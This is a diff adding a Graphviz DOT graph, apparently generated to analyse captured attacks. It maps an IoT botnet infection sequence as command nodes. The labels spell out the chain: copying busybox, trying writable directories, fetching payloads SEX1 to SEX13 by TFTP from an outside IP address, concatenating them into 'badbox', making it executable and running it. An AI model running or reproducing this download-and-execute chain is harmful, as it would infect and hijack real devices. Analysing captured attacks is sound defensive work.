@@ -1,0 +1,264 @@
+digraph {
+0 [label="ulimit -n 1024 "];
+0 -> 0
+2 [label="cp /bin/busybox /tmp/ "];
+2 -> 2
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 14 [label="||,"];
+14 [label="tftp 185.145.131.173 -c get SEX1 "];
+14 -> 16 [label=";,"];
+16 [label="cat SEX1 badbox "];
+16 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 34 [label="||,"];
+34 [label="tftp 185.145.131.173 -c get SEX2 "];
+34 -> 36 [label=";,"];
+36 [label="cat SEX2 badbox "];
+36 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 54 [label="||,"];
+54 [label="tftp 185.145.131.173 -c get SEX4 "];
+54 -> 56 [label=";,"];
+56 [label="cat SEX4 badbox "];
+56 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 74 [label="||,"];
+74 [label="tftp 185.145.131.173 -c get SEX3 "];
+74 -> 76 [label=";,"];
+76 [label="cat SEX3 badbox "];
+76 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 94 [label="||,"];
+94 [label="tftp 185.145.131.173 -c get SEX5 "];
+94 -> 96 [label=";,"];
+96 [label="cat SEX5 badbox "];
+96 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 114 [label="||,"];
+114 [label="tftp 185.145.131.173 -c get SEX6 "];
+114 -> 116 [label=";,"];
+116 [label="cat SEX6 badbox "];
+116 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 134 [label="||,"];
+134 [label="tftp 185.145.131.173 -c get SEX7 "];
+134 -> 136 [label=";,"];
+136 [label="cat SEX7 badbox "];
+136 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 154 [label="||,"];
+154 [label="tftp 185.145.131.173 -c get SEX8 "];
+154 -> 156 [label=";,"];
+156 [label="cat SEX8 badbox "];
+156 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 174 [label="||,"];
+174 [label="tftp 185.145.131.173 -c get SEX9 "];
+174 -> 176 [label=";,"];
+176 [label="cat SEX9 badbox "];
+176 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 194 [label="||,"];
+194 [label="tftp 185.145.131.173 -c get SEX10 "];
+194 -> 196 [label=";,"];
+196 [label="cat SEX10 badbox "];
+196 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 214 [label="||,"];
+214 [label="tftp 185.145.131.173 -c get SEX11 "];
+214 -> 216 [label=";,"];
+216 [label="cat SEX11 badbox "];
+216 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 234 [label="||,"];
+234 [label="tftp 185.145.131.173 -c get SEX12 "];
+234 -> 236 [label=";,"];
+236 [label="cat SEX12 badbox "];
+236 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 254 [label="||,"];
+254 [label="tftp 185.145.131.173 -c get SEX13 "];
+254 -> 256 [label=";,"];
+256 [label="cat SEX13 badbox "];
+256 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+}
